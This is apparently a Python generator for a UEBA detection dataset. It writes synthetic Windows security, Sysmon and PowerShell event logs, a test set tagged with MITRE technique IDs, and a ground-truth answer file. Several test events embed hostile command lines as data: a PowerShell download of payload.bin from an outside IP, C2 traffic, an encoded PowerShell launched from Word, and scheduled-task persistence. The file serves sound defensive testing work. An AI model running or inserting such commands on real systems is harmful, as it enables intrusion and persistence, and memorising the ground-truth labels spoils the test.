"""
attack_simulator.generator.ueba_dataset
=======================================
Sinh dữ liệu Baseline 7 ngày (1,078 events) cho 3 người dùng & 3 máy trạm/máy chủ,
kèm bộ test 18 sự kiện (trong đó có 8 đòn tấn công Atomic Red Team) và Ground Truth JSON.
"""

from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

from attack_simulator.core.xml_utils import build_windows_event_xml

def generate_ueba_baseline_and_test_datasets(
    output_dir: str | Path,
    base_start: datetime | None = None,
) -> tuple[Path, Path, Path]:
    """Generate 7-day Windows VM UEBA Baseline XML (1,078 events) + Atomic Red Team Test XML + Ground Truth."""
    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)
    origin = base_start or datetime(2025, 3, 1, 0, 0, 0, tzinfo=timezone.utc)
    baseline_xml_events: list[str] = []

    for day in range(7):
        day_origin = origin + timedelta(days=day)
        for hour in (8, 9, 10, 11, 13, 14, 15, 16, 17):
            slot = day_origin + timedelta(hours=hour)

            # 1) nguyen.an on PC-01
            if hour in (8, 13):
                baseline_xml_events.append(
                    build_windows_event_xml(
                        provider="Microsoft-Windows-Security-Auditing",
                        computer="PC-01",
                        event_id=4624,
                        timestamp=slot + timedelta(minutes=2),
                        data_fields={"TargetUserName": "nguyen.an", "LogonType": "2", "IpAddress": "10.10.1.101"},
                    )
                )
            for idx, proc in enumerate(
                (
                    r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                    r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
                    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    r"C:\Windows\explorer.exe",
                )
            ):
                baseline_xml_events.append(
                    build_windows_event_xml(
                        provider="Microsoft-Windows-Security-Auditing",
                        computer="PC-01",
                        event_id=4688,
                        timestamp=slot + timedelta(minutes=5 + idx * 3),
                        data_fields={
                            "SubjectUserName": "nguyen.an",
                            "NewProcessName": proc,
                            "CreatorProcessName": r"C:\Windows\explorer.exe",
                        },
                    )
                )
            for net_idx, (dest_ip, dest_port) in enumerate(
                (("10.10.1.10", "445"), ("10.10.1.53", "53"), ("198.51.100.10", "443"))
            ):
                baseline_xml_events.append(
                    build_windows_event_xml(
                        provider="Microsoft-Windows-Security-Auditing",
                        computer="PC-01",
                        event_id=5156,
                        timestamp=slot + timedelta(minutes=20 + net_idx * 2),
                        data_fields={
                            "Application": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                            "Direction": "%%14592",
                            "DestAddress": dest_ip,
                            "DestPort": dest_port,
                            "Protocol": "6",
                        },
                    )
                )
            if hour == 17:
                baseline_xml_events.append(
                    build_windows_event_xml(
                        provider="Microsoft-Windows-Security-Auditing",
                        computer="PC-01",
                        event_id=4634,
                        timestamp=slot + timedelta(minutes=45),
                        data_fields={"TargetUserName": "nguyen.an", "LogonType": "2"},
                    )
                )

            # 2) tran.binh on PC-02
            if hour in (8, 13):
                baseline_xml_events.append(
                    build_windows_event_xml(
                        provider="Microsoft-Windows-Security-Auditing",
                        computer="PC-02",
                        event_id=4624,
                        timestamp=slot + timedelta(minutes=3),
                        data_fields={"TargetUserName": "tran.binh", "LogonType": "2", "IpAddress": "10.10.1.102"},
                    )
                )
            for idx, proc in enumerate(
                (
                    r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
                    r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                    r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                    r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
                )
            ):
                baseline_xml_events.append(
                    build_windows_event_xml(
                        provider="Microsoft-Windows-Sysmon",
                        computer="PC-02",
                        event_id=1,
                        timestamp=slot + timedelta(minutes=6 + idx * 3),
                        data_fields={
                            "User": r"CORP\tran.binh",
                            "Image": proc,
                            "ParentImage": r"C:\Windows\explorer.exe",
                        },
                    )
                )
            for net_idx, (dest_ip, dest_port) in enumerate(
                (("10.10.1.10", "445"), ("10.10.1.53", "53"), ("198.51.100.20", "443"))
            ):
                baseline_xml_events.append(
                    build_windows_event_xml(
                        provider="Microsoft-Windows-Sysmon",
                        computer="PC-02",
                        event_id=3,
                        timestamp=slot + timedelta(minutes=22 + net_idx * 2),
                        data_fields={
                            "User": r"CORP\tran.binh",
                            "Image": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                            "DestinationIp": dest_ip,
                            "DestinationPort": dest_port,
                        },
                    )
                )

            # 3) admin.it on SRV-FILE01
            if 9 <= hour <= 16:
                if hour in (9, 14):
                    baseline_xml_events.append(
                        build_windows_event_xml(
                            provider="Microsoft-Windows-Security-Auditing",
                            computer="SRV-FILE01",
                            event_id=4624,
                            timestamp=slot + timedelta(minutes=1),
                            data_fields={"TargetUserName": "admin.it", "LogonType": "10", "IpAddress": "10.10.1.50"},
                        )
                    )
                baseline_xml_events.append(
                    build_windows_event_xml(
                        provider="Microsoft-Windows-Security-Auditing",
                        computer="SRV-FILE01",
                        event_id=4688,
                        timestamp=slot + timedelta(minutes=10),
                        data_fields={
                            "SubjectUserName": "admin.it",
                            "NewProcessName": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                            "CreatorProcessName": r"C:\Windows\explorer.exe",
                            "CommandLine": "powershell.exe Get-Service",
                        },
                    )
                )
                baseline_xml_events.append(
                    build_windows_event_xml(
                        provider="Microsoft-Windows-PowerShell",
                        computer="SRV-FILE01",
                        event_id=4104,
                        timestamp=slot + timedelta(minutes=11),
                        data_fields={"SubjectUserName": "admin.it", "ScriptBlockText": "Get-Service | Get-ChildItem"},
                    )
                )
                baseline_xml_events.append(
                    build_windows_event_xml(
                        provider="Microsoft-Windows-Security-Auditing",
                        computer="SRV-FILE01",
                        event_id=5156,
                        timestamp=slot + timedelta(minutes=15),
                        data_fields={
                            "Application": r"C:\Windows\System32\svchost.exe",
                            "Direction": "%%14592",
                            "DestAddress": "10.10.1.53",
                            "DestPort": "53",
                            "Protocol": "17",
                        },
                    )
                )

    baseline_path = out / "windows_baseline_7days.xml"
    baseline_path.write_text("<Events>\n" + "\n".join(baseline_xml_events) + "\n</Events>\n", encoding="utf-8")

    test_day = origin + timedelta(days=7)
    test_specs: list[tuple[str, dict[str, Any]]] = []

    def add_test_event(
        *,
        record_id: str,
        provider: str,
        host: str,
        event_id: int,
        timestamp: datetime,
        data: dict[str, str],
        is_anomaly: bool,
        scenario: str,
        atomic_test_id: str | None = None,
        mitre_technique_id: str | None = None,
        expected_deviation_tags: list[str] | None = None,
    ) -> None:
        xml_str = build_windows_event_xml(
            provider=provider, computer=host, event_id=event_id, timestamp=timestamp, data_fields=data
        )
        test_specs.append(
            (
                xml_str,
                {
                    "record_id": record_id,
                    "timestamp": timestamp.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
                    "host": host,
                    "username": (
                        data.get("TargetUserName")
                        or data.get("SubjectUserName")
                        or data.get("User", "").split("\\")[-1]
                        or None
                    ),
                    "windows_event_id": event_id,
                    "is_anomaly": is_anomaly,
                    "scenario": scenario,
                    "atomic_test_id": atomic_test_id,
                    "mitre_technique_id": mitre_technique_id,
                    "expected_deviation_tags": expected_deviation_tags or [],
                },
            )
        )

    # Normal morning activity (8 events)
    add_test_event(
        record_id="test-001", provider="Microsoft-Windows-Security-Auditing", host="PC-01", event_id=4624,
        timestamp=test_day + timedelta(hours=8, minutes=5),
        data={"TargetUserName": "nguyen.an", "LogonType": "2", "IpAddress": "10.10.1.101"},
        is_anomaly=False, scenario="normal_office_logon_pc01",
    )
    add_test_event(
        record_id="test-002", provider="Microsoft-Windows-Security-Auditing", host="PC-01", event_id=4688,
        timestamp=test_day + timedelta(hours=8, minutes=10),
        data={"SubjectUserName": "nguyen.an", "NewProcessName": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", "CreatorProcessName": r"C:\Windows\explorer.exe"},
        is_anomaly=False, scenario="normal_word_usage_pc01",
    )
    add_test_event(
        record_id="test-003", provider="Microsoft-Windows-Security-Auditing", host="PC-01", event_id=4688,
        timestamp=test_day + timedelta(hours=8, minutes=15),
        data={"SubjectUserName": "nguyen.an", "NewProcessName": r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", "CreatorProcessName": r"C:\Windows\explorer.exe"},
        is_anomaly=False, scenario="normal_excel_usage_pc01",
    )
    add_test_event(
        record_id="test-004", provider="Microsoft-Windows-Security-Auditing", host="PC-01", event_id=5156,
        timestamp=test_day + timedelta(hours=8, minutes=20),
        data={"Application": r"C:\Program Files\Google\Chrome\Application\chrome.exe", "Direction": "%%14592", "DestAddress": "198.51.100.10", "DestPort": "443", "Protocol": "6"},
        is_anomaly=False, scenario="normal_https_browsing_pc01",
    )
    add_test_event(
        record_id="test-005", provider="Microsoft-Windows-Security-Auditing", host="PC-02", event_id=4624,
        timestamp=test_day + timedelta(hours=8, minutes=12),
        data={"TargetUserName": "tran.binh", "LogonType": "2", "IpAddress": "10.10.1.102"},
        is_anomaly=False, scenario="normal_office_logon_pc02",
    )
    add_test_event(
        record_id="test-006", provider="Microsoft-Windows-Sysmon", host="PC-02", event_id=1,
        timestamp=test_day + timedelta(hours=8, minutes=18),
        data={"User": r"CORP\tran.binh", "Image": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "ParentImage": r"C:\Windows\explorer.exe"},
        is_anomaly=False, scenario="normal_edge_usage_pc02",
    )
    add_test_event(
        record_id="test-007", provider="Microsoft-Windows-Security-Auditing", host="SRV-FILE01", event_id=4624,
        timestamp=test_day + timedelta(hours=9, minutes=2),
        data={"TargetUserName": "admin.it", "LogonType": "10", "IpAddress": "10.10.1.50"},
        is_anomaly=False, scenario="normal_admin_logon_srv",
    )
    add_test_event(
        record_id="test-008", provider="Microsoft-Windows-PowerShell", host="SRV-FILE01", event_id=4104,
        timestamp=test_day + timedelta(hours=9, minutes=10),
        data={"SubjectUserName": "admin.it", "ScriptBlockText": "Get-Service"},
        is_anomaly=False, scenario="normal_admin_powershell_srv",
    )

    # Atomic Red Team Scenario A: 2 AM Attack Chain on PC-01 (nguyen.an)
    add_test_event(
        record_id="test-009", provider="Microsoft-Windows-Security-Auditing", host="PC-01", event_id=4624,
        timestamp=test_day + timedelta(days=1, hours=2, minutes=1),
        data={"TargetUserName": "nguyen.an", "LogonType": "10", "IpAddress": "10.10.1.250"},
        is_anomaly=True, scenario="atomic_off_hours_logon_2am_pc01",
        atomic_test_id="T1078-Atomic-OffHoursLogon", mitre_technique_id="T1078",
        expected_deviation_tags=["unusual_login_hour", "unusual_machine_activity_hour"],
    )
    add_test_event(
        record_id="test-010", provider="Microsoft-Windows-Security-Auditing", host="PC-01", event_id=4688,
        timestamp=test_day + timedelta(days=1, hours=2, minutes=2),
        data={"SubjectUserName": "nguyen.an", "NewProcessName": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CreatorProcessName": r"C:\Windows\explorer.exe", "CommandLine": "powershell.exe -NoProfile"},
        is_anomaly=True, scenario="atomic_unusual_powershell_spawn_pc01",
        atomic_test_id="T1059.001-Atomic-PowerShellSpawn", mitre_technique_id="T1059.001",
        expected_deviation_tags=["unusual_user_activity_hour", "unusual_process_for_user", "unusual_process_for_machine"],
    )
    add_test_event(
        record_id="test-011", provider="Microsoft-Windows-PowerShell", host="PC-01", event_id=4104,
        timestamp=test_day + timedelta(days=1, hours=2, minutes=3),
        data={"SubjectUserName": "nguyen.an", "ScriptBlockText": "whoami /all"},
        is_anomaly=True, scenario="atomic_whoami_discovery_pc01",
        atomic_test_id="T1033-1-SystemOwnerDiscovery", mitre_technique_id="T1033",
        expected_deviation_tags=["unusual_powershell_command"],
    )
    add_test_event(
        record_id="test-012", provider="Microsoft-Windows-PowerShell", host="PC-01", event_id=4104,
        timestamp=test_day + timedelta(days=1, hours=2, minutes=4),
        data={"SubjectUserName": "nguyen.an", "ScriptBlockText": "Invoke-WebRequest -Uri https://203.0.113.99/payload.bin -OutFile C:\\Users\\Public\\payload.bin"},
        is_anomaly=True, scenario="atomic_powershell_file_download_pc01",
        atomic_test_id="T1105-Atomic-PowerShellDownload", mitre_technique_id="T1105",
        expected_deviation_tags=["unusual_powershell_command", "download_or_transfer_marker"],
    )
    add_test_event(
        record_id="test-013", provider="Microsoft-Windows-Security-Auditing", host="PC-01", event_id=5156,
        timestamp=test_day + timedelta(days=1, hours=2, minutes=5),
        data={"Application": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "Direction": "%%14592", "DestAddress": "203.0.113.99", "DestPort": "8443", "Protocol": "6"},
        is_anomaly=True, scenario="atomic_unusual_outbound_c2_pc01",
        atomic_test_id="T1071.001-Atomic-WebProtocolsC2", mitre_technique_id="T1071.001",
        expected_deviation_tags=["unusual_network_connection"],
    )

    # Atomic Red Team Scenario B: Daytime Contextual Anomalies on SRV-FILE01 & PC-02
    add_test_event(
        record_id="test-014", provider="Microsoft-Windows-Security-Auditing", host="SRV-FILE01", event_id=4624,
        timestamp=test_day + timedelta(days=1, hours=10, minutes=15),
        data={"TargetUserName": "nguyen.an", "LogonType": "3", "IpAddress": "10.10.1.101"},
        is_anomaly=True, scenario="atomic_lateral_logon_unusual_host",
        atomic_test_id="T1078-Atomic-UnusualHostAccess", mitre_technique_id="T1078",
        expected_deviation_tags=["unusual_machine_for_user", "unusual_user_for_machine"],
    )
    add_test_event(
        record_id="test-015", provider="Microsoft-Windows-Sysmon", host="PC-02", event_id=1,
        timestamp=test_day + timedelta(days=1, hours=11, minutes=0),
        data={"User": r"CORP\tran.binh", "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", "CommandLine": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"},
        is_anomaly=True, scenario="atomic_encoded_powershell_pc02",
        atomic_test_id="T1059.001-Atomic-EncodedCommand", mitre_technique_id="T1059.001",
        expected_deviation_tags=["unusual_process_for_user", "unusual_process_for_machine", "unusual_powershell_command", "encoded_or_obfuscated_script_marker"],
    )
    add_test_event(
        record_id="test-016", provider="Microsoft-Windows-Sysmon", host="PC-02", event_id=1,
        timestamp=test_day + timedelta(days=1, hours=11, minutes=2),
        data={"User": r"CORP\tran.binh", "Image": r"C:\Windows\System32\schtasks.exe", "ParentImage": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": r'schtasks.exe /create /tn "AtomicUpdater" /tr "C:\Users\Public\payload.bin" /sc daily'},
        is_anomaly=True, scenario="atomic_schtasks_persistence_pc02",
        atomic_test_id="T1053.005-Atomic-ScheduledTask", mitre_technique_id="T1053.005",
        expected_deviation_tags=["unusual_process_for_user", "unusual_process_for_machine"],
    )

    # Normal afternoon activity (2 events)
    add_test_event(
        record_id="test-017", provider="Microsoft-Windows-Security-Auditing", host="PC-01", event_id=4688,
        timestamp=test_day + timedelta(days=1, hours=14, minutes=10),
        data={"SubjectUserName": "nguyen.an", "NewProcessName": r"C:\Program Files\Google\Chrome\Application\chrome.exe", "CreatorProcessName": r"C:\Windows\explorer.exe"},
        is_anomaly=False, scenario="normal_afternoon_chrome_pc01",
    )
    add_test_event(
        record_id="test-018", provider="Microsoft-Windows-Sysmon", host="PC-02", event_id=3,
        timestamp=test_day + timedelta(days=1, hours=15, minutes=5),
        data={"User": r"CORP\tran.binh", "Image": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "DestinationIp": "198.51.100.20", "DestinationPort": "443"},
        is_anomaly=False, scenario="normal_afternoon_network_pc02",
    )

    test_xml_path = out / "windows_test_atomic.xml"
    test_xml_path.write_text("<Events>\n" + "\n".join(xml for xml, _ in test_specs) + "\n</Events>\n", encoding="utf-8")

    ground_truth_path = out / "windows_ground_truth.json"
    ground_truth_path.write_text(
        json.dumps(
            {
                "schema_version": 1,
                "title": "GlobalBan Windows UEBA Baseline vs Atomic Red Team Ground Truth",
                "baseline_file": baseline_path.name,
                "test_file": test_xml_path.name,
                "records": [meta for _, meta in test_specs],
            },
            indent=2,
            sort_keys=True,
        )
        + "\n",
        encoding="utf-8",
    )

    return baseline_path, test_xml_path, ground_truth_path
